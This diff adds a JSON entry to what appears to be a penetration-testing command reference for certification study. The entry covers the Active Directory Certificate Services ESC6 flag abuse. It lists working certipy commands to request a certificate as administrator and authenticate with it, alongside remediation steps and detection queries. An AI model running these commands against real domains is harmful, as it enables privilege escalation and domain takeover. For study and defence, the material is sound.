@@ -1,0 +1,89 @@
+{
+  "id": "ad-adcs-esc6-editf-flag",
+  "name": "ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse",
+  "command": "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template User -upn administrator@<domain>",
+  "description": "ESC6 targets CAs where the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set. This flag allows ANY certificate requester to specify a Subject Alternative Name (SAN) in the request, regardless of template settings. Any template with enrollment rights becomes an ESC1-equivalent.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "ADCS Attacks",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps ADCS whitepaper; certipy",
+  "tags": [
+    "adcs",
+    "esc6",
+    "editf",
+    "san",
+    "certipy",
+    "pki",
+    "certificate-authority"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nIf the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, ANY enrollable\ntemplate becomes exploitable - the requester can add a SAN for\nany user, bypassing template restrictions.\n\n=== DETECT ===\n  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable\n  # Look for: [!] CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set\n\n  # Manual check (from CA):\n  certutil -config \"CA01\\CORP-CA\" -getreg policy\\EditFlags\n  # Check for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)\n\n=== EXPLOIT ===\n  # Request cert with SAN for administrator\n  certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local\n\n  # Authenticate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== NOTES ===\n- The EDITF flag is set on the CA itself, not on templates\n- ANY template with client auth EKU + enrollment rights is exploitable\n- The User template is commonly available to all domain users\n- Common in older ADCS deployments\n\n=== REMEDIATION ===\n  certutil -config \"CA01\\CORP-CA\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2\n  net stop certsvc && net start certsvc",
+  "examples": [
+    {
+      "label": "Check if EDITF flag is set",
+      "command": "certipy find -u user@corp.local -p pass -dc-ip 192.168.1.10 -vulnerable"
+    },
+    {
+      "label": "Request cert with admin SAN",
+      "command": "certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local"
+    },
+    {
+      "label": "Authenticate with forged cert",
+      "command": "certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "ESC6 - HackTricks",
+      "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag on the CA tells it to accept attacker-supplied SANs in certificate requests, regardless of what the template allows.",
+    "prerequisites": "CA with EDITF flag set; enrollment rights on any client-auth template.",
+    "impact": "Any domain user can request a certificate as any other user, including Domain Admin.",
+    "detection": "[MITRE T1649] Certificate requests with SANs that do not match the requester.",
+    "artifacts": "Event 4886/4887 (cert request/issue) with SAN different from requester.",
+    "splunk_spl": "index=wineventlog EventCode=4887\n| where RequesterName!=SubjectAlternativeName\n| table _time, RequesterName, SubjectAlternativeName, CertificateTemplate",
+    "elastic_kql": "event.code:\"4887\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| project TimeGenerated, RequesterName, CertificateTemplate",
+    "sigma_rules": "win_adcs_esc6_san_abuse",
+    "prevention": "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag; restart CA service after removal.",
+    "sources": [
+      "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC6 - Certificate issued with mismatched SAN",
+        "logic": "SecurityEvent\n| where EventID == 4887\n| extend SAN = extract(\"SubjectAlternativeName=(.*?)(;|$)\", 1, EventData)\n| where isnotempty(SAN) and SAN !contains SubjectUserName\n| project TimeGenerated, SubjectUserName, SAN, CertificateTemplate",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4887"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Service accounts requesting certs for managed endpoints",
+        "tuning": "Exclude known service account patterns; focus on admin-level SAN values"
+      }
+    ]
+  }
+}
